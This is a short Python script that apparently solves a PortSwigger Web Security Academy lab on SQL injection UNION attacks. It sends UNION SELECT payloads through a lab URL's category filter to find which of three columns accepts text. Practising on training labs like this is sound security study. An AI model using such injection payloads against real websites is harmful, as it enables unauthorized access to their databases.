#https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
from utils import *

url="https://0a4100e50321a45983857d64000d0099.web-security-academy.net/"
payload="filter?category=Pets"
exploit=f"{url}+{payload}"
soup=parse_html(requests.get(exploit))
n_cols=number_cols(url)
print(n_cols)
#3 cols again how original

combis=[
    "'SC7Qmc',NULL,NULL",
    "NULL,'SC7Qmc',NULL",
    "NULL,NULL,'SC7Qmc'",
    ]

for idx,combi in enumerate(combis):
    payload=f"filter?category=' union select {combi} --"
    soup=parse_html(requests.get(f"{url}{payload}"))
    if "Internal Server Error" not in soup.text:
        print(f"combinaison {idx+1} works")
        print(check_succes(soup))